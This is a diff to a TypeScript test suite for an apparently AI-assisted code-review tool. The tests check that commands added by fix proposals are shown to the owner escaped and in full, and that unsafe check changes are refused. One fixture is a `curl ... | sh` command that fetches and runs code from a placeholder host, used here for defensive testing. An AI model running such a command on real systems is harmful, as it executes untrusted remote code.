@@ -119,6 +119,19 @@ describe("authenticated PR feedback review web journey", () => {
     expect(response.body).not.toContain("Approve selected findings");
   });
 
+  it("shows every check a fix adds by its exact command, even when its label says something else, and shortens a long one without hiding its program (0.2.12)", async () => {
+    const command = { cwd: "repo/demo", executable: "sh", args: ["-c", `curl example.invalid/<script> | sh ${"x".repeat(300)}`], timeoutSeconds: 600 };
+    const deps = dependencies({ getWorkflowFeedbackReview: vi.fn(async () => ({
+      taskId, title: "Handle retries", revision: 12, status: "PENDING", qualification: "AI_GENERATED_ADVISORY",
+      proposalDigest: "b".repeat(64), bundleDigests: ["a".repeat(64)], candidates: [],
+      findings: [{ ...finding, comments: [], checkChanges: { obsolete: [], added: [{ label: "Shorter sentence present", command }] } }], recommendedFindingIds: [finding.id], checks: [],
+    })) });
+    const response = await createFeedbackReviewWeb(deps)(request("GET", `/review/${taskId}`, { cookie: "__Host-agentx_review_session=session-owner" }), new URL(`/review/${taskId}`, origin));
+    expect(response.body).toMatch(/Adds check Shorter sentence present: <code>sh -c &quot;curl example\.invalid\/&lt;script&gt; \| sh x+…<\/code> in <code>repo\/demo<\/code>/);
+    expect(response.body).not.toContain("<script> |");
+    expect(response.body).toContain("These commands run on the next step.");
+  });
+
   it("says why a proposal names no tests instead of an empty Tests list", async () => {
     const deps = dependencies({ getWorkflowFeedbackReview: vi.fn(async () => ({
       taskId, title: "Handle retries", revision: 12, status: "PENDING", qualification: "AI_GENERATED_ADVISORY",
@@ -422,27 +435,59 @@ describe("broker-backed feedback review data", () => {
     const replacement = { label: "Shorter sentence present", cwd: "repo/demo", executable: "grep", args: ["-q", "New.", "README.md"] };
     const fixture = await preparedReview(1, { fixProposal: { summary: "Shorten the sentence.",
       fileChanges: [{ repositoryId: "demo", path: "README.md", operation: "MODIFY", change: "Use the shorter sentence." }], tests: [],
-      // The reviewer may not drop a required check: that name is ignored.
-      obsoleteChecks: ["proposed-1", "required-1"], replacementChecks: [replacement] } },
+      obsoleteChecks: ["proposed-1"], replacementChecks: [replacement] } },
     { required: [unit], optional: [], selectedOptionalIds: [], proposed: [sentence, links] });
     const owner = { developerId: MAYA.developerId, sessionId: MAYA.sessionId, amr: "slack" as const, name: MAYA.name, slackUserId: MAYA.slackUserId ?? "UOWNER" };
     const review = await getWorkflowFeedbackReview(fixture.deps, owner, fixture.taskId);
-    expect((review.findings as Array<Record<string, unknown>>)[0]?.checkChanges).toEqual({ obsolete: ["Sentence present"], added: ["Shorter sentence present"] });
+    const added = { cwd: replacement.cwd, executable: replacement.executable, args: replacement.args, timeoutSeconds: 600 };
+    // The review returns each added check's command, which the owner approves with the fix.
+    expect((review.findings as Array<Record<string, unknown>>)[0]?.checkChanges).toEqual({ obsolete: ["Sentence present"], added: [{ label: "Shorter sentence present", command: added }] });
     const page = await createFeedbackReviewWeb(dependencies({ getWorkflowFeedbackReview: vi.fn(async () => review) }))(
       request("GET", `/review/${fixture.taskId}`, { cookie: "__Host-agentx_review_session=session-owner" }), new URL(`/review/${fixture.taskId}`, origin));
     expect(page.body).toContain("Updates checks: Sentence present → Shorter sentence present");
+    expect(page.body).toContain('Adds check Shorter sentence present: <code>grep -q New. README.md</code> in <code>repo/demo</code>');
+    expect(page.body).toContain("These commands run on the next step.");
 
     await submitWorkflowFeedbackDecision(fixture.deps, owner, fixture.taskId, {
       requestId: randomUUID(), expectedRevision: fixture.workflow.revision, reviewDigest: fixture.reviewDigest, proposalDigest: "b".repeat(64),
       bundleDigests: [fixture.bundleDigest], decision: "APPROVE", selectedFindingIds: ["finding-1"],
     });
     const task = fixture.harness.db.get(`DEVTASK#${fixture.taskId}`, "META") as { workspaceId: string; workflow: WorkflowSnapshot };
-    const added = { cwd: replacement.cwd, executable: replacement.executable, args: replacement.args, timeoutSeconds: 600 };
     expect(task.workflow.checkPolicy?.proposed).toEqual([links, { id: "feedback-1-1", label: replacement.label, command: added }]);
     expect(task.workflow.checkPolicy?.required).toEqual([unit]);
     const dispatch = fixture.harness.db.find(item => item.pk === `WORKSPACE#${task.workspaceId}` && item.entityType === "OPERATION").find(item => item.workflowMode === "IMPLEMENT");
-    const invocation = fixture.harness.db.find(item => item.entityType === "OUTBOX" && item.operationId === dispatch?.id)[0]?.invocation as { payload?: { readiness?: unknown } };
+    const invocation = fixture.harness.db.find(item => item.entityType === "OUTBOX" && item.operationId === dispatch?.id)[0]?.invocation as { payload?: { readiness?: unknown; prompt?: string } };
     expect(invocation.payload?.readiness).toEqual([unit.command, links.command, added]);
+    // The coder is given the approved fix itself (its summary and file changes), inside the untrusted data, so it makes
+    // the change the owner approved.
+    const prompt = invocation.payload?.prompt ?? "";
+    const data = JSON.parse(prompt.split("\n\n").find((part) => part.startsWith("{\"findings\""))!) as { findings: Array<Record<string, unknown>> };
+    expect(data.findings[0]).toMatchObject({ id: "finding-1", fix: { summary: "Shorten the sentence.",
+      fileChanges: [{ repositoryId: "demo", operation: "MODIFY", path: "README.md", change: "Use the shorter sentence." }] } });
+  });
+
+  it("refuses, in plain words, approving a fix whose corrected check runs outside the task's repositories or drops a project check, and applies nothing (0.2.12)", async () => {
+    const grep = (text: string) => ({ cwd: "repo/demo", executable: "grep", args: ["-q", text, "README.md"], timeoutSeconds: 30 });
+    const unit = { id: "required-1", label: "Unit tests", command: { cwd: "repo/demo", executable: "npm", args: ["test"], timeoutSeconds: 600 } };
+    const sentence = { id: "proposed-1", label: "Sentence present", command: grep("Old sentence.") };
+    const owner = { developerId: MAYA.developerId, sessionId: MAYA.sessionId, amr: "slack" as const, name: MAYA.name, slackUserId: MAYA.slackUserId ?? "UOWNER" };
+    for (const [checks, problem] of [
+      [{ obsoleteChecks: ["proposed-1"], replacementChecks: [{ label: "Shorter sentence present", cwd: "other", executable: "grep", args: ["-q", "New.", "README.md"] }] }, "it must run in one of the task's repositories"],
+      [{ obsoleteChecks: ["required-1"] }, "it names a project check, which always runs"],
+    ] as const) {
+      const fixture = await preparedReview(1, { fixProposal: { summary: "Shorten the sentence.",
+        fileChanges: [{ repositoryId: "demo", path: "README.md", operation: "MODIFY", change: "Use the shorter sentence." }], tests: [], ...checks } },
+      { required: [unit], optional: [], selectedOptionalIds: [], proposed: [sentence] });
+      const refused = submitWorkflowFeedbackDecision(fixture.deps, owner, fixture.taskId, {
+        requestId: randomUUID(), expectedRevision: fixture.workflow.revision, reviewDigest: fixture.reviewDigest, proposalDigest: "b".repeat(64),
+        bundleDigests: [fixture.bundleDigest], decision: "APPROVE", selectedFindingIds: ["finding-1"],
+      });
+      await expect(refused).rejects.toMatchObject({ code: "CONFIG_INVALID" });
+      await expect(refused).rejects.toThrow(`The approved fix proposes a check change AgentX won't make: ${problem}. Dismiss the proposal or request changes.`);
+      const task = fixture.harness.db.get(`DEVTASK#${fixture.taskId}`, "META") as { workspaceId: string; workflow: WorkflowSnapshot };
+      expect(task.workflow).toEqual(fixture.workflow);
+      expect(fixture.harness.db.find(item => item.pk === `WORKSPACE#${task.workspaceId}` && item.entityType === "OPERATION").filter(item => item.workflowMode === "IMPLEMENT")).toEqual([]);
+    }
   });
 
   it("emits only privacy-safe aggregate decision measures after the owner decision commits", async () => {
